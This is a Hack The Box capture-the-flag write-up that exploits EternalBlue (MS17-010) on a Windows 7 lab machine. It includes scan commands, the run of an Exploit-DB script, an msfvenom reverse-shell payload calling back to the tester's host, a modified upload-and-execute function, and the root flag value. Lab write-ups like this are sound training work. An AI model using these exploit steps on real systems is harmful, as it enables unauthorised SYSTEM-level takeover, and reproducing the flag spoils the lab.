# Blue

*Blue, while possibly the simplest machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.*


### Recon

Started the recon with an Nmap scan:

```bash
sudo nmap -T4 -sS -n -Pn --disable-arp-ping --stats-every=5s -F 10.10.10.40
```

- **-T4**: Sets the timing template for faster scanning.
- **-sS**: Performs a TCP SYN scan.
- **-n**: Disables DNS resolution.
- **-Pn**: Skips host discovery (pinging).
- **-F**: Scans the top TCP ports.

The initial scan reveals several open ports, including:

- 135/tcp open  msrpc
- 139/tcp open  netbios-ssn
- 445/tcp open  microsoft-ds (Samba)
- Multiple high-numbered ports (49152-49157) open for Microsoft services.

Next, I performed a more detailed scan to identify the operating system and versions of the services:

```bash
sudo nmap -T4 -A -Pn -n --disable-arp-ping 10.10.10.40 --source-port 53 -p 135,139,445,49152,49153,49154,49155,49156,49157

sudo nmap -v --script vuln,exploit -p 135,139,445 10.10.10.40
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:

|     Risk factor: HIGH

|        servers (ms17-010).

```

This identified the target as **Windows 7 Professional 7601 Service Pack 1**, making it susceptible to the EternalBlue exploit (MS17-010).

### Exploitation:

MS17-010 is a critical vulnerability in SMBv1 (CVE-2017-0144). Exploiting it allows remote code execution with SYSTEM-level privileges.

#### Preparing the Exploit:

First, I copied the exploit script from the `exploitdb` directory to my working directory:

```bash
(kaliã‰¿kali)-[~/Red_Team/HTB/Blue]
”””€$ cp /usr/share/exploitdb/exploits/windows/remote/42315.py ./4315.py
```

The exploit is written in Python 2.7, and when I tried to run it, syntax issues arose due to the differences between Python 2.7 and Python 3. To resolve this, I created a Python 2.7 virtual environment:

1. **Download pip** for Python 2.7:

    ```bash
    wget -c https://bootstrap.pypa.io/pip/2.7/get-pip.py
    python2.7 get-pip.py
    ```

2. **Verify the pip version** and set up the virtual environment:

    ```bash
    > python2 -m pip --version
    pip 20.3.4 from /home/kali/.local/lib/python2.7/site-packages/pip (python 2.7)
    > python2 -m pip install -U pip setuptools
    > python2 -m pip install virtualenv   
    > python2.7 -m virtualenv myenv
    ```

3. **Activate the virtual environment** and install the required dependencies, like `impacket`, which is essential for running the exploit smoothly.

4. **Downloading Dependencies** - Found a note of this missing library in the exploit,

    ```bash
    EDB Note: mysmb.py can be found here ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py

    > wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
    ```

#### Running the Exploit:

With the environment set up, I executed the modified script using Python 2.7:

```bash
”€”€(myenv)”€(kaliã‰¿kali)-[~]
”””€$ python Red_Team/HTB/Blue/4315.py 10.10.10.40 netlogon
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa80041f95e0

FLINK: 0xfffff8a00a10a088
InParam: 0xfffff8a00a10415c
MID: 0x2103
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
```

The output indicated a successful exploitation process.

### Knowledge Share:

SMB servers use *named pipes* to communicate with various services for authentication:

- **Domain-joined SMB Servers** use the *Netlogon* service to communicate with the domain controller for authentication.
- **Standalone SMB Servers** interact with the local *SAM (Security Account Manager)* database via the `\samr` pipe to verify credentials.
- The **Local Security Authority (LSA)** manages security policies and access controls through its communication with the SMB server.

For testing purposes, running the command with random "username" and "password" can help in exploring these interactions during an exploit attempt.

### Custom Exploit:

For a deeper understanding, I modified the EternalBlue exploit script to upload a custom reverse shell and execute it:

1. **Creating the executable payload** using `msfvenom`:

    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=8080 -f exe > Benign.exe
    ```

2. **Modifying the script** to transfer and execute the payload:

    ```python
    def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()
        print('Creating file C:\\Benign.exe on the target')
        smb_send_file(smbConn, '/home/kali/Red_Team/HTB/Blue/Benign.exe', 'C', '/Benign.exe')
        service_exec(conn, r'cmd /c C:\\Benign.exe')
    ```

3. **Running the script** gave me a reverse shell back to my machine, maintaining SYSTEM access.

### Post-Exploitation:

After successful exploitation, I had SYSTEM-level access:

```bash
C:\Windows\system32> whoami
nt authority\system
```

This means complete control over the machine, including access to any files. Retrieving the flag:

```bash
C:\Users\Administrator\Desktop> type root.txt
734ac76b26b651a6658354572badeb63
```

### Conclusion:

The Blue machine on Hack The Box is a great example of how a seemingly outdated vulnerability like EternalBlue can still pose a significant risk if left unpatched. Proper patch management and disabling legacy protocols like SMBv1 are critical for maintaining secure networks.
